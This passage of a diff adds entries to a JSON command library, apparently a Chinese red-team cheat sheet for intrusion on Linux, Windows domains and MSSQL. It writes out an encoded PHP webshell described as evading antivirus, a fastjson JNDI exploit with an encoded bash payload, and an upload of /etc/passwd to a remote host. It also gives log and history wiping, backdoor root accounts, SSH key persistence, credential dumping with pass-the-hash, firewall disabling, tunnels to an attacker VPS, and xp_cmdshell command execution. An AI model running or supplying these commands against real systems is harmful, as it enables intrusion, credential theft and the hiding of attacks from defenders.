+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取网络信息",
+    "command": "查看当前网络地址:\n/sbin/ifconfig -a\ncat /etc/network/interfaces\ncat /etc/susconfig/network\n查看网络配置、DNS、 DHCP、网关:\ncat /etc/resolv.conf\ncat /etc/sysconfig/network\ncat /etc/networks\niptables -L\nhostname //查看计算机名\ndnsdomainname\n查看网络通信:\nlsof -i\nlsof -i :80\ngrep 80 /etc/services\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\nchkconfig --list\nchkconfig --list | grep 3:on\n查看缓存:\narp -e\nroute\n/sbin/route -nee\n\n查看当前ip：\nifconfig | /sbin/ifconfig | /sbin/ip a |ip a | ip addr  | /bin/busybox ifconfig | hostname -I\n查看本机ip：\ncat /proc/net/tcp tcp的连接信息\ncat /proc/net/arp 查看arp信息\ncat /proc/net/fib_trie 查看ip信息\nawk '/32 host/ { print f } {f=$2}' \u003c\u003c\u003c \"$(\u003c/proc/net/fib_trie)\"\n\n匹配ip网卡：\nip a|grep -oP \"inet \\K[0-9.]*(?=.*[^ ][^l][^o]$)\"\nifconfig | grep -oP '(?\u003c=inet )[\\d.]+'\nifconfig | awk '/inet / {print $2}'\nifconfig | sed -En 's/.*inet (addr:)?(([0-9]*\\.){3}[0-9]*).*/\\2/p'\nifconfig eth0 | awk '/inet addr/{print substr($2,6)}'\n\n查看端口信息：netstat -anplut\n查看hosts文件：cat /etc/hosts\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-其他常用命令",
+    "command": "linux设置终端代理： export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\nlinx终端搜索软件： find / -name pass.txt\nlinux查找后缀properties文件内容带password字样： find / -name *.properties | xargs grep password //xml,sh,python等等\nlinux把tomcat目录文件和文件夹列表导出到oa.txt： find /home/tomcat/ -type f \u003e oa.txt\n编码字符base64然后echo输出logo.php再进行解码： echo -n \"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+\" | base64 -d \u003e logo.php //可绕过杀软拦截关键字",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-端口转发",
+    "command": "LCX:\nlcx -\u003clisten|tran|slave\u003e\ncx -listen 4567 33891 #Attacker\nlcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets\nSSH:\nssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]\nssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port\nssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port\nmknod:\nmknod backpipe p ; nc -l -p [remote port] \u003c backpipe | nc [local IP] [local port] \u003ebackpipe\nmknod backpipe p ; nc -l -p 8080 \u003c backpipe | nc 10.1.1.251 80 \u003ebackpipe\nmknod backpipe p ; nc -l -p 8080 0 \u0026 \u003c backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1\u003ebackpipe # Proxy (Port 80 to 8080)\nmknod backpipe p ; nc -l -p 8080 0 \u0026 \u003c backpipe | tee -a inflow | nc localhost 80 | tee -a outflow \u0026 1\u003ebackpipe # Proxy monitor (Port 80 to 8080)\n隧道:\nssh -D 127.0.0.1:9050 -N [username]@[ip]\nproxychains ifconfig",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查找文件",
+    "command": "find / -name passwd",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-写文件",
+    "command": "echo xxxxx== |base64 -d \u003e /var/www/html/1.jsp",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-网络Ping探测",
+    "command": "for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i \u0026\u003e/dev/null; then echo $i is alived; fi; done",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "fastjson执行命令",
+    "command": "java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,cGluZyBgd2hvYW1pYC4xZnUwYnguZG5zbG9nLmNu}|{base64,-d}|{bash,-i}\" -A \"x.x.x.x\"",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看成功登陆",
+    "command": "sudo grep 'Accepted' /var/log/* | grep sshd\n\nlast 查看Linux系统的用户登录记录-实时更新：last\nlastlog 查看Linux系统的用户登录记录-只在登录时更新：lastlog\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-删除成功登陆的ip地址",
+    "command": "sudo sed -i '/116.xx.xxx.xxx/d' /var/log/secure",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-ssh",
+    "command": "ssh端口查询：\nnetstat -tulnp | grep $(ps aux | grep '[s]shd' | awk '{print $2}' | head -n 1)\n\nCentos ssh 登录日志：\ngrep 'Accepted' /var/log/secure | awk '{print $11}'\n\nUbuntu ssh 登录日志：\ngrep 'Accepted' /var/log/auth.log | awk '{print $11}'\n\nssh远程登录：\nsed -i '/PermitRootLogin /c PermitRootLogin yes' /etc/ssh/sshd_config\n\nssh密码认证登录：\nsed -i \"s/.*PasswordAuthentication.*/PasswordAuthentication yes/g\" /etc/ssh/sshd_config\n\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-递归修改文件属性",
+    "command": "source_file=\"xxxxx\" target_folder=\"xxxxx\" \u0026\u0026 chmod -R --reference=\"$source_file\" \"$target_folder\" \u0026\u0026 chown -R --reference=\"$source_file\" \"$target_folder\" \u0026\u0026 find \"$target_folder\" -exec touch -r \"$source_file\" {} ;",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看linux配置资源",
+    "command": "echo -e \"Memory:\\n$(free -h)\\n\\nCPU Info:\\n$(lscpu | grep 'Model name')\\n\\nDisk Usage:\\n$(df -h)\"",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-ssh密钥权限维持",
+    "command": "ssh-keygen -t ed25519 -N \"admin\" -f ./id_ed25519 \u0026\u0026 mkdir -p ~/.ssh \u0026\u0026 cat ./id_ed25519.pub \u003e\u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 700 ~/.ssh \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\n---------------------------\nssh-keygen\nmkdir -p ~/.ssh\necho \"你的公钥内容\" \u003e\u003e ~/.ssh/authorized_keys\ncat id_rsa.pub \u003e\u003e ~/.ssh/authorized_keys\n\nchmod 600 ~/.ssh/authorized_keys\n\nssh -i /path/to/id_rsa user@remote_host\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-当前会话不记录history",
+    "command": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0\n\n清除当前用户的history命令记录：\nhistory -c\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Win-net命令",
+    "command": "查看用户列表: net user\n\npowershell查看用户列表: Get-WmiObject -Class Win32_UserAccount\n\n查看用户组列表: net localgroup\n\n查看管理组列表: net localgroup Administrators\n\n添加用户并设置密码: net user ASP.NET P@ssw0rd /add\n\n将用户加入管理组: net localgroup Administrators ASP.NET /add\n\n将用户加入桌面组: net localgroup \"Remote Desktop Users\" guest /add\n\n激活guest用户: net user guest /active:yes\n\n更改guest用户的密码: net user guest P@ssw0rd\n\n将用户加入管理组: net localgroup administrators guest /add\n\n将用户加入桌面组: net localgroup \"Remote Desktop Users\" guest /add\n\n查看本地密码策略: net accounts\n\n查看当前会话: net session\n\n建立IPC会话: net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-域渗透",
+    "command": "查看当前用户权限: whoami /user\n\n可知域名为和其他信息: net config workstation\n\n查询域用户：net user /domain\n\n添加域用户: net user ASP.NET Admin12345 /add /domain\n\n添加域管理员: net group \"domain admins\" ASP.NET /add /domain\n\n添加企业管理员: net group \"enterprise admins\" /add /domain\n\n查询域管理员用户：net group \"domain admins\" /domain\n\n查询域企业管理组: net group \"enterprise admins\" /domain\n\n查询域本地管理组: net localgroup administrators /domain\n\n查询域控制器和时间：net time /domain\n\n查询域名称：net view /domain\n\n查询域内计算机：net view /domain:redteam.local\n\n查看当前域内计算机列表: net group \"domain computers\" /domain\n\n查看域控机器名: net group \"domain controllers\" /domain\n\n查看域密码策略: net accounts /domain\n\n查看域信任: nltest /domain_trusts\n\n查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:10.10.10.10\n\n通过srv记录: nslookup -type=SRV _ldap._tcp.corp",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-信息收集常用",
+    "command": "查看当前用户的安全特权: whoami /priv\n\n查看当前用户: whoami /user\n\n查看当前登陆用户: query user \u0026\u0026 quser\n\n查看系统版本和补丁信息: systeminfo\n\n查看系统开放端口: netstat -ano\n\n查看系统进程: tasklist /svc\n\n列出详细进程: tasklist /V \u0026\u0026 tasklist /V /FO CSV\n\n查看ip地址和dns信息: ipconfig /all\n\n查看当前用户保存的凭证: cmdkey /list\n\n查看路由信息:route print\n\n查看arp列表: arp -a\n\n查看当前用户保存的票据凭证: klist\n\n查看3389端口:for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq TermService\" /NH') do netstat -ano | findstr %i | findstr LISTENING\n\nWindows存储的凭证:rundll32 keymgr.dll,KRShowKeyMgr",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-网卡netsh和防火墙信息",
+    "command": "查看网卡信息“netsh interface show interface\n\n设置主dns：netsh interface ip set dns \"以太网\" static 114.114.114.114 primary\n\n设置备dns：netsh interface ip add dns \"以太网\" 8.8.8.8\n\n查看防火墙状态：netsh advfirewall show allprofiles\n\n防火墙恢复默认配置：netsh firewall reset\n\n开启防火墙：netSh Advfirewall set allprofiles state on\n\n关闭防火墙：netSh Advfirewall set allprofiles state off\n\n放行3389端口：netsh advfirewall firewall add rule name=3389_test dir=in action=allow protocol=TCP localport=3389\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-其他",
+    "command": "sc命令：\n创建服务: sc \\\\127.0.0.1 create Emeripe binPath= \"cmd.exe /c start c:\\programdata\\info.bat\"\n启动服务: sc \\\\127.0.0.1 start Emeripe\n删除服务: sc \\\\127.0.0.1 delete Emeripe\n\n远程桌面登录到 console 会话解决 hash 无法抓出问题：mstsc /admin\n将用户会话连接到远程桌面会话：tscon ID(quser)\n根据进程名字终止进程:taskkill /f /t /im msedge.exe\n根据进程pid终止进程:taskkill /f /pid 17676\ntasklist查看远程主机进程:\ntasklist /s 192.168.3.200 /u Aadministrator /p Password\ntasklist /s 192.168.3.110 /u offensive\\administrator /P Password /V\n\nrunas启动其它用户进程:runas /user:administrator /savecred \"cmd.exe /k whoami\"\n\nwindows开机启动路径：C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n\n设置永久环境变量：setx /M PATH \"%PATH%;%SystemRoot%\\system32\"\n\nicacls设置文件权限：icacls.exe \"C:\\\\windows\\\\win.ini\" /grant Users:(F)\n\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Linux-命令其他",
+    "command": "Linux设置终端代理：export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n\nlinux更换系统源：bash \u003c(curl -sSL https://gitee.com/SuperManito/LinuxMirrors/raw/main/ChangeMirrors.sh)\nhttps://cdn.jsdelivr.net/gh/SuperManito/LinuxMirrors@main/ChangeMirrors.sh\n\nvps更换系统源和pip源：\ncurl https://gitee.com/SuperManito/LinuxMirrors/raw/main/ChangeMirrors.sh -O\nchmod +x ChangeMirrors.sh\n./ChangeMirrors.sh\nyum install git wget unzip gcc make net-tools -y\nmkdir ~/.pip\ncat \u003c\u003c EOF \u003e\u003e ~/.pip/pip.conf\n[global]\nindex-url = https://pypi.tuna.tsinghua.edu.cn/simple\ntrusted-host = pypi.tuna.tsinghua.edu.cn\nEOF\n\npython 的 pty 来转换为 交互式shell：\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c '__import__(\"pty\").spawn(\"/bin/bash\")'\npython3 -c \"import os;os.system('/bin/bash')\"\n\n添加环境变量：export PATH=\"/home/test/.local/bin:$PATH\"\n\n添加admin:123 yunwei:toor输出到/etc/passwd：\n//base64 追加 admin:123\necho \"YWRtaW46TFJ4TTNuUDNMT2lZVTowOjA6aGVsbG86L3Jvb3Q6L2Jpbi9iYXNo\" | base64 -d \u003e\u003e /etc/passwd\n\necho admin:LRxM3nP3LOiYU:0:0:hello:/root:/bin/bash | tee -a /etc/passwd\necho yunwei:LRIOkHebiD5iw:0:0:hello:/root:/bin/bash | tee -a /etc/passwd\n\necho 192.168.3.110 DC.offensive.local offensive.local DC | tee -a /etc/hosts\necho \"192.168.3.110 DC.offensive.local offensive.local DC\" | sudo tee -a /etc/hosts \u003e /dev/null\nbash -c 'echo \"192.168.3.110 DC.offensive.local offensive.local DC\" \u003e\u003e /etc/hosts'\n\n添加账号admin:Admin12345：\n使用 sudo 代替直接 root 权限\nsudo usermod -aG sudo adminc  # Debian/Ubuntu\n# 或\nsudo usermod -aG wheel adminc  # RHEL/CentOS\n\nsudo useradd -m -s /bin/bash admin \u0026\u0026 echo \"admin:toor\" | sudo chpasswd \u0026\u0026 sudo usermod -aG wheel admin\nsudo useradd -m -s /bin/bash adminb \u0026\u0026 echo \"adminb:toor\" | sudo chpasswd\nsudo useradd -m -o -u 0 -g 0 -s /bin/bash admin \u0026\u0026 echo \"admin:toor\" | sudo chpasswd\n\n强制修改UID\nsudo usermod -o -u 0 -g 0 adminc\n\nmkpasswd生成$6密码:123456 shadow套件：mkpasswd -m sha-512 123456\n\nopenssl 生成/etc/passwd密码：openssl passwd 123456\n\ncurl发送文件：\ncurl -F \"file=@/etc/passwd\" http://192.168.1.100/chfs/upload\ncurl -F \"file=@/etc/passwd\" http://192.168.1.100:8000/\n\n查看进程信息：ps -ef | ps -aux\n\n增加capabilities权限：\nsudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap\n\n/sbin/nologin导致不能su username：usermod -s /bin/bash postgre\n\nLinx终端搜索软件：find / -name pass.txt\n\n查找后缀properties文件内容带password字样：\nfind / -name *.properties | xargs grep password    //xml,sh,python,等等\n\n把tomcat目录文件和文件夹列表导出到oa.txt：\nfind /home/tomcat/ -type f \u003e oa.txt\n\n停止防火墙：\nsystemctl stop firewalld\nservice iptables stop\n\nubuntu:\nufw disable\n搜索敏感信息\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-docker",
+    "command": "docker进入容器：docker exec -it /bin/bash id\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-ntp时间同步",
+    "command": "禁用 ntp(时间同步)：\ntimedatectl set-ntp false \ntimedatectl set-ntp 0\n\n启用：\ntimedatectl set-ntp true\ntimedatectl set-ntp 1\n\n查看时间：\nhttps://blog.csdn.net/weixin_45450567/article/details/125043250\ndate\ntzselect\nsudo hwclock --show\n\n修改时间：\nsudo date -s \"2000/05/05 12:00:00\"\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-系统日志文件",
+    "command": "/var/log/btmp   记录所有登录失败信息，使用lastb命令查看\n/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看\n/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看\n/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看\n/var/log/secure   记录与安全相关的日志信息\n/var/log/message  记录系统启动后的信息和错误日志\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-PID",
+    "command": "根据目的ip及端口查找Pid：\nnetstat -pantu | grep 114.114.114.114 \nnetstat -pantu | grep 65533 \nlsof -i:65533\n\n根据本机ip+端口查找Pid：\nnetstat -pantu | grep 65533\nlsof -i:65533\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "隧道代理",
+    "command": "iox：\n下载地址：https://github.com/EddieIvan01/iox\n\n### proxy\n\n\u003e 在本地 0.0.0.0:1080启动Socks5服务\n\n./iox proxy -l 1080\n\n\u003e 加密转发 socks5 代理：\n\nVPS 监听(//将1080端口监听到的流量转发至50054端口):\nnohup ./iox proxy -l 50054 -l 1081 -k 3211 \u003e iox.log \u0026  \n\n在目标主机执行(//启动代理服务并发送至VPS 50054端口)：\n./iox proxy -r VPSIP:50054 -k 3211  \n\n然后本地socks5代理：socks5://vps:1081\nfwd\n\u003e 本地端口转发 3389 至VPS:\nvps执行:\nnohup ./iox fwd -l *8888 -l 33890 -k 22222\n\n目标机器执行:\niox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222\n\n随后连接 VPS:33890 即可访问内网 3389\n\nfuso：\nGithub：https://github.com/editso/fuso\n\n### socks\n\n#VPS：\n./fus\n\n#被控机\n./fuc.exe VPSIP 6722 --socks\n\n#### readme\n1. 端口转发\nfuc --forward-host xxx.xxx.xxx.xxx --forward-port\n   --forward-host: 转发到的地址\n   --forward-port: 转发到的端口\n   如: 转发流量到内网 10.10.10.4:3389\n   \u003e fuc --forward-host 10.10.10.4 --forward-port 3389\n\n2. socks5:\nfuc --socks --su --s5p xxx --s5u xxx\n   --su: 可选的, 开启udp转发, \n   --s5p: 可选的, 认证密码, 默认不进行密码认证\n   --s5u 可选的, 认证账号, 默认账号 anonymous\n   --socks: 可选的, 开启socks5代理, 未指定--su的情况下不会转发udp\n   如: 开启udp转发与密码认证\n   \u003e fuc --socks --su --s5p 123 --s5u socks\n   此时, 已开启udp转发,连接密码为 \"123\",账号为 \"socks\"\n\n3. 指定穿透成功时访问的端口\n   fuc -b xxxx\n   -b | --visit-bind-port: 可选的, 默认随机分配\n   如: 访问外网端口 8888 转发到内网 80\n   \u003e fuc --forward-port 80 -b 8888\n   \n4. 桥接模式 注意: 目前不能转发udp\n   fuc --bridge-listen xxxx --bridge-port xxx \n   --bridge-listen | --bl: 监听地址, 默认 127.0.0.1\n   --bridge-port | --bp: 监听端口, 默认不启用桥接\n   如: 开始桥接模式,并监听在9999端口, 本机ip地址为: 10.10.10.2\n   \u003e fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 开启桥接\n   \u003e fuc 10.10.10.2 9999 # 建立连接\n\n   级联: \n   \u003e fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 第一级, IP: 10.10.10.2\n    \u003e fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.10.10.2 9999 # 第二级, IP: 10.10.10.3\n     \u003e fuc 10.10.10.3 9991 # 最终 \n\n5. 将连接信息通知到 Telegram 或其他\n   fus --observer \"program:[arguments]\"\n   --observer: 建立连接或断开连接时的钩子\n   如: 使用bash脚本将连接信息通知到tg\n   \u003e fus --observer \"/bin/bash:[telegram.sh]\"\n\n6. 指定客户端与服务端通信的端口\n   fuc --channel-port 8888 ...\n   --channel-port: 可选的, 客户端与服务端通信端口, 默认随机\n\n\npingtunnel+frp 搭 icmp 隧道：\npingtunnel 下载：https://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6\n\n### 被控机\nnohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 \u003ep.log \u0026\n\n\npingtunnel -l 监听本地的9999端口 -s vps主机IP  -t vps主机frp服务端口\n\n### VPS\n./pingtunnel -type server\n./frps -c frps.ini\n\n本地代理vps的 10015 端口加上密码即可使用icmp隧道。\n\n参考文章：https://www.cnblogs.com/cute-puli/p/15213394.html\n\nFRP：\n\n* 将 frps 及 frps.ini 放到具有公网 IP 的机器上。\n* 将 frpc 及 frpc.ini 放到处于内网环境的机器上。\n\n服务端：frps -c frps.ini\n\n客户端：frpc -c frpc.ini\n#frpc.ini\n[common]\nserver_addr = 127.0.0.1\nserver_port = 10000\ntoken = PassW0Rd\n\n[zhaoshangju_10078]\ntype = tcp\nremote_port = 10015\nplugin = socks5\nplugin_user = thIsuserAS\nplugin_passwd = Passweqwe0Rm\nuse_encryption = true\n\nGithub:https://github.com/fatedier/frp\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Win-Powershell",
+    "command": "powershell 绕过执行策略：\nSet-ExecutionPolicy -ExecutionPolicy Bypass\npowershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\script.ps1\n\n强制 Bypass 作用本计算机：\nSet-ExecutionPolicy Bypass -Scope LocalMachine -Force\n\n查看本机安装软件列表：\nGet-WmiObject -Class win32_product | Select-Object -Property name,version\n\n查看域计算机数量：\npowershell -c (Get-ADComputer -Filter *).Count\n\n查看域用户数量：\npowershell -c (Get-ADUser -Filter *).Count\n\n查看任务列表详情-描述：\nGet-Process | Select-Object ProcessName, Id, Path, Description\nGet-Process | Select-Object ProcessName, Id, Path, Description | Export-Csv -Path \"processes.csv\" -NoTypeInformation -Encoding UTF8\nGet-Process | Select-Object ProcessName, Id, Path, Description | Out-File -FilePath \"processes.txt\" -Encoding UTF8\nGet-WmiObject Win32_Process | Select-Object ProcessId, Name, ExecutablePath, CommandLine | Export-Csv -Path \"processes.csv\" -NoTypeInformation -Encoding UTF8\n\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-impacket",
+    "command": "workgroup = ./Administrator\nDomain = offensive/Administrator\n\nDC域控导出域内hash\nreg save HKLM\\SYSTEM system.hiv\nreg save HKLM\\SAM sam.hiv\nreg save hklm\\security security.hiv\nsecretsdump.exe -sam sam.hiv -security security.hiv -system system.hiv LOCAL\n\nDC导出域内所有用户hash\nreg save HKLM\\SYSTEM system.hiv\nsecretsdump.exe -system system.hiv -ntds ntds.dit LOCAL\n\nsecretsdump 查看域内所有用户hash：\nimpacket-secretsdump offensive/Administrator:Admin12345@offensive.local -dc-ip 192.168.3.110\n\nimpacket-secretsdump -hashes :ccef208c6485269c20db2cad21734fe7 offensive/Administrator@offensive.local -dc-ip 192.168.3.110\n\nsecretsdump查看Administrator用户hash：\nimpacket-secretsdump offensive/Administrator:Admin12345@offensive.local -dc-ip 192.168.3.110 -just-dc-user Administrator\n\nimpacket-psexec 票据传递：\nimpacket-getTGT -hashes :ccef208c6485269c20db2cad21734fe7 offensive.local/administrator\n\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec offensive.local/Administrator@DC.offensive.local -k -no-pass -codec gbk\n\nimpacket-psexec 命令执行：\nimpacket-psexec offensive/administrator:Admin12345@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-psexec pth命令执行：\nimpacket-psexec -hashes :ccef208c6485269c20db2cad21734fe7 offensive/administrator@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-wmiexec 命令执行：\nimpacket-wmiexec offensive/administrator:Admin12345@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-wmiexec pth命令执行：\nimpacket-wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 offensive/administrator@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-atexec 命令执行：\nimpacket-atexec offensive/administrator:Admin12345@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-smbexec 命令执行：\nimpacket-smbexec offensive/administrator:Admin12345@192.168.3.110 -codec gbk\n\nimpacket-smbexec pth命令执行：\nimpacket-smbexec -hashes :ccef208c6485269c20db2cad21734fe7 offensive/administrator@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-dcomexec 命令执行：\nimpacket-dcomexec offensive/administrator:Admin12345@192.168.3.110 -codec gbk\n\nimpacket-dcomexec -hashes :ccef208c6485269c20db2cad21734fe7 offensive/administrator@192.168.3.110 \"whoami /user\" -codec gbk\n\nimpacket-lookupsid-查看用户sid：\nimpacket-lookupsid -hashes :ccef208c6485269c20db2cad21734fe7 offensive/administrator@192.168.3.110\n\nimpacket-GetADUsers-查询所有用户：\nimpacket-GetADUsers -all offensive.local/Administrator:Admin12345 -dc-ip 192.168.3.110\n\nimpacket-GetADUsers-查询所有计算机：\nimpacket-GetADComputers offensive.local/Administrator:Admin12345 -dc-ip 192.168.3.110\n\nimpacket-reg 查看注册表信息：\n查看3389端口：\nimpacket-reg offensive/administrator:Admin12345@192.168.3.173 query -keyName \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" -v \"PortNumber\"\n开启3389：\nimpacket-reg offensive/administrator:Admin12345@192.168.3.173 add -keyName \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections -vt REG_DWORD -vd 0\n开启抓取明文：\nimpacket-reg ./Administrator@192.168.3.173 -hashes ':ccef208c6485269c20db2cad21734fe7' add -keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -v 'UseLogonCredential' -vt 'REG_DWORD' -vd '1'\n\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "MSSQL",
+    "command": "\n    Mssql查找开放端口\n\nfor /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq MSSQLSERVER\" /NH') do netstat -ano | findstr %i | findstr LISTENING\n\n    Mssql开启xp_cmdshell\n\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n    Mssql关闭xp_cmdshell\n\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\n\n    Mssql xp_cmdshell执行命令\n\nEXEC master..xp_cmdshell \"whoami /user\";\n\n    Mssql开启SP_OACreate\n\nexec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;\n\n    Mssql关闭SP_OACreate\n\nexec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',0;RECONFIGURE;\n\n    Mssql执行命令有回显-SP_OACreate\n\ndeclare @luan int,@exec int,@text int,@str varchar(8000);\nexec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;\nexec sp_oamethod @luan,'exec',@exec output,'C:\\\\windows\\\\system32\\\\cmd.exe /c whoami';\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'readall', @str out\nselect @str;\n\ndeclare @test int,@exec int,@text int,@str varchar(8000);exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@test output;exec sp_oamethod @test,'exec',@exec output,'ipconfig /all';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out;select @str;--+\n\n    Mssql执行命令无回显-SP_OACreate\n\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami \u003eC:\\\\Window\\\\Temp\\\\1.txt'\n\n    Mssql执行命令sp_execute_external_script\n\n    开启sp_execute_external_script\n\nEXECUTE sp_configure 'external scripts enabled', 1;RECONFIGURE;\n\n    利用Python语言执行系统命令\n\nEXECUTE sp_execute_external_script\n@language =N'Python',\n@script=N'import subprocess;subprocess.call([\"whoami\"],shell=True)'\n\n    利用R语言执行系统命令\n\nEXECUTE sp_execute_external_script\n@language = N'R',\n@script = N'system(\"whoami\")'\n\n    Mssql输出base64文件\n\nexec master..xp_cmdshell '\u003e\u003ec:\\windows\\temp\\vars.txt set /p=\"123456\" \u003cnul'; //代替echo输出\n\n    查看c盘下web.config文件\n\nfindstr /c:\"User Id=\" /c:\"Password=\" /si web.config \u003e\u003e tmp.log\nfindstr /c:\"uid=\" /c:\"Password=\" /si web.config \u003e\u003e tmp.log\n\n    常SQL规工作组内网环境下的mssql实例\n\nPowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\"\n\n    Mssql查询sa密码\n\nSELECT \n    name, \n    is_disabled, \n    CONVERT(NVARCHAR(MAX), password_hash, 1) AS password_hash_hex\nFROM sys.sql_logins;\n\n    Mssql查询管理员密码\n\nSelect name,is_disabled,master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins\n\n    查询那些用户有管理员权限\n\nSELECT\np.name AS [LoginName],\np.type_desc AS [LoginType],\np.is_disabled AS [IsDisabled],\np.create_date AS [CreateDate]\nFROM sys.server_principals p\nJOIN sys.server_role_members rm ON p.principal_id = rm.member_principal_id\nJOIN sys.server_principals r ON rm.role_principal_id = r.principal_id\nWHERE r.name = 'sysadmin';\n\n    列出所有库\n\nSELECT name FROM MASTER..SysDatabases ORDER BY Name;--+\n\nSELECT NAME FROM MASTER.dbo.SysDatabases ORDER BY NAME;--+\n\n    列出某个库所有表\n\nSELECT Name FROM [databasename]..SysObjects Where XType='U' ORDER BY Name;--+\n\n    列出表的字段\n\nSELECT TABLE_CATALOG,TABLE_NAME,COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = 'tablename';--+\n\nSELECT COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = 'tablename';--+\n\n    varbinary数据类型hex编码\n\nSELECT TOP 2 sys.fn_varbintohexstr(pass),user FROM [dbo].[admin];--+\n\n    xp_dirtree列目录\n\nexec master.dbo.xp_dirtree [c:\\windows\\],1,1;--+\n\nexec master.dbo.xp_dirtree 'c:\\windows\\',1,1;--+\n\nexec 